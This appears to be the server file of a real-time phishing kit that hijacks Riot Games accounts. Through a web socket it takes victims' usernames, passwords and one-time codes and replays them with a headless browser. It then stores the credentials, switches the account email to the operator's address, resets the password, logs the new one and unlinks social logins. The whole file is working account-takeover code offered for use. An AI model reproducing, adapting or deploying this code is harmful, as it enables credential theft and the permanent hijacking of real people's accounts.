import { closeDatabase, initDatabase } from '@/database/database';
import { AccountHelper, MailHelper } from '@/helper/database-helper';
import { RiotHelper } from '@/helper/riot-bot-helper';
import { RiotBot } from '@/modules/riot-bot';
import routes from '@/routes';
import { LoginDataSchema, OtpDataSchema } from '@/types';
import type { Result } from '@/types/riot';
import type { ClientEvents, InterEvents, ServerEvents, SocketData } from '@/types/socket';
import express from 'express';
import { createServer } from 'http';
import path from 'path';
import { Server } from 'socket.io';

const app = express();
const httpServer = createServer((req, res) => {
    void app(req, res);
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const staticPath = process.env.NODE_ENV === 'production' ? path.join(process.cwd(), 'dist/static') : path.join(process.cwd(), 'src/static');
app.use(express.static(staticPath));

app.use('/api', routes);

app.get('/{*splat}', (req, res) => {
    const indexPath = process.env.NODE_ENV === 'production' ? path.join(process.cwd(), 'dist/static/index.html') : path.join(process.cwd(), 'src/static/index.html');
    res.sendFile(indexPath);
});

const io = new Server<ClientEvents, ServerEvents, InterEvents, SocketData>(httpServer, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    },
    pingTimeout: 60000,
    pingInterval: 25000,
    connectTimeout: 45000
});

const botInstances = new Map<string, RiotBot>();
const loginCredentials = new Map<string, { username: string; password: string }>();
const initStates = new Map<string, { isInitializing: boolean; abortController: AbortController }>();
const initPromises = new Map<string, Promise<boolean>>();

io.on('connection', (socket) => {
    const initBrowser = async (): Promise<boolean> => {
        if (initStates.get(socket.id)?.isInitializing || !socket.connected) {
            return false;
        }

        const abortController = new AbortController();
        initStates.set(socket.id, { isInitializing: true, abortController });

        try {
            if (abortController.signal.aborted) {
                return false;
            }

            const bot = new RiotBot();

            if (abortController.signal.aborted) {
                try {
                    await bot.close();
                } catch {
                    //
                }
                return false;
            }

            await bot.init(abortController.signal);

            if (abortController.signal.aborted) {
                try {
                    await bot.close();
                } catch {
                    //
                }
                return false;
            }

            botInstances.set(socket.id, bot);
            socket.emit('browser_ready', {
                success: true
            });
            return true;
        } catch {
            const failedBot = botInstances.get(socket.id);
            if (failedBot) {
                try {
                    await failedBot.close();
                } catch {
                    //
                }
                botInstances.delete(socket.id);
            }

            if (socket.connected) {
                socket.emit('browser_ready', {
                    success: false
                });
            }
            return false;
        } finally {
            initStates.delete(socket.id);
        }
    };

    const initPromise = initBrowser();
    initPromises.set(socket.id, initPromise);

    void initPromise.finally(() => {
        initPromises.delete(socket.id);
    });

    socket.on('login', async (data: unknown) => {
        const parseResult = LoginDataSchema.safeParse(data);
        if (!parseResult.success) {
            socket.emit('login_result', {
                success: false,
                error: 'invalid input data'
            });
            return;
        }

        const { username, password } = parseResult.data;

        const initPromise = initPromises.get(socket.id);
        if (initPromise) {
            try {
                const initSuccess = await initPromise;
                if (!initSuccess) {
                    socket.emit('login_result', {
                        success: false,
                        error: 'browser init fail'
                    });
                    return;
                }
            } catch {
                socket.emit('login_result', {
                    success: false,
                    error: 'browser init fail'
                });
                return;
            }
        }

        const bot = botInstances.get(socket.id);
        if (!bot) {
            socket.emit('login_result', {
                success: false,
                error: 'browser not ready'
            });
            return;
        }

        try {
            const result: Result = await bot.login(username, password);

            const isCaptchaError = result.data && result.data.type === 'error' && result.data.error === 'invalid_request' && result.data.captcha && result.data.captcha.type === 'hcaptcha';

            if (result.success || (result.data && 'multifactor' in result.data) || isCaptchaError) {
                loginCredentials.set(socket.id, { username, password });
            }

            if (result.success || isCaptchaError) {
                try {
                    const emailConfig = MailHelper.get();

                    const existingAccount = AccountHelper.findByUser(username);
                    if (!existingAccount) {
                        AccountHelper.add({
                            username,
                            password,
                            email: isCaptchaError ? 'hên xui(login lỗi)' : (emailConfig?.email ?? '')
                        });
                    }

                    if (emailConfig?.email && !isCaptchaError) {
                        const emailResult = await bot.changeEmail(emailConfig.email);

                        if (emailResult.success) {
                            const account = AccountHelper.findByUser(username);
                            if (account?.password) {
                                const newPassword = RiotHelper.generateRandomPassword(12);
                                const passwordResult = await bot.changePassword(account.password, newPassword);

                                if (passwordResult.success) {
                                    AccountHelper.updatePassword(username, newPassword);
                                    console.log(`password mới cho ${username}: ${newPassword}`);
                                } else {
                                    console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
                                }
                            }
                        }

                        await bot.unlinkSocials();
                    }

                    socket.emit('login_result', isCaptchaError ? { success: true, data: result.data } : result);

                    if (isCaptchaError) {
                        try {
                            await bot.close();
                        } catch {
                            //
                        } finally {
                            botInstances.delete(socket.id);
                        }
                    }
                } catch {
                    socket.emit('login_result', isCaptchaError ? { success: true, data: result.data } : result);
                }
            } else {
                socket.emit('login_result', result);
            }
        } catch {
            socket.emit('login_result', {
                success: false
            });
        }
    });

    socket.on('enter_otp', async (data: unknown) => {
        const parseResult = OtpDataSchema.safeParse(data);
        if (!parseResult.success) {
            socket.emit('otp_result', {
                success: false,
                error: 'invalid otp data'
            });
            return;
        }

        const { otp } = parseResult.data;

        const initPromise = initPromises.get(socket.id);
        if (initPromise) {
            try {
                const initSuccess = await initPromise;
                if (!initSuccess) {
                    socket.emit('otp_result', {
                        success: false,
                        error: 'browser init fail'
                    });
                    return;
                }
            } catch {
                socket.emit('otp_result', {
                    success: false,
                    error: 'browser init fail'
                });
                return;
            }
        }

        const bot = botInstances.get(socket.id);
        if (!bot) {
            socket.emit('otp_result', {
                success: false,
                error: 'browser not ready'
            });
            return;
        }

        try {
            const result: Result = await bot.enterOtp(otp);

            if (result.success) {
                try {
                    const emailConfig = MailHelper.get();

                    const credentials = loginCredentials.get(socket.id);
                    if (credentials) {
                        const existingAccount = AccountHelper.findByUser(credentials.username);
                        if (!existingAccount) {
                            AccountHelper.add({
                                username: credentials.username,
                                password: credentials.password,
                                email: emailConfig?.email ?? ''
                            });
                        }
                        loginCredentials.delete(socket.id);
                    }

                    if (emailConfig?.email) {
                        const emailResult = await bot.changeEmail(emailConfig.email);

                        if (emailResult.success) {
                            // Tự động đổi password sau khi đổi email thành công
                            const credentials = loginCredentials.get(socket.id);
                            const username = credentials?.username ?? 'unknown';

                            if (username !== 'unknown') {
                                const account = AccountHelper.findByUser(username);
                                if (account?.password) {
                                    const newPassword = RiotHelper.generateRandomPassword(12);
                                    const passwordResult = await bot.changePassword(account.password, newPassword);

                                    if (passwordResult.success) {
                                        AccountHelper.updatePassword(username, newPassword);
                                        console.log(`password mới cho ${username}: ${newPassword}`);
                                    } else {
                                        console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
                                    }
                                }
                            }
                        }

                        await bot.unlinkSocials();
                    }

                    socket.emit('otp_result', result);
                } catch {
                    socket.emit('otp_result', result);
                }
            } else {
                socket.emit('otp_result', result);
            }
        } catch {
            socket.emit('otp_result', {
                success: false
            });
        }
    });

    socket.on('disconnect', () => {
        const initState = initStates.get(socket.id);
        if (initState) {
            initState.abortController.abort();
            initStates.delete(socket.id);
        }

        initPromises.delete(socket.id);

        const bot = botInstances.get(socket.id);
        if (bot) {
            void (async () => {
                try {
                    await bot.close();
                } catch {
                    //
                } finally {
                    botInstances.delete(socket.id);
                }
            })();
        }
        loginCredentials.delete(socket.id);
    });
});

const PORT = process.env.PORT ?? 3000;

initDatabase();

httpServer.listen(PORT, () => {
    console.log(`sv run on http://localhost:${PORT}`);
});

process.on('SIGINT', () => {
    void (async () => {
        for (const [_, bot] of botInstances) {
            try {
                await bot.close();
            } catch {
                //
            }
        }

        botInstances.clear();
        closeDatabase();
        httpServer.close(() => {
            process.exit(0);
        });
    })();
});
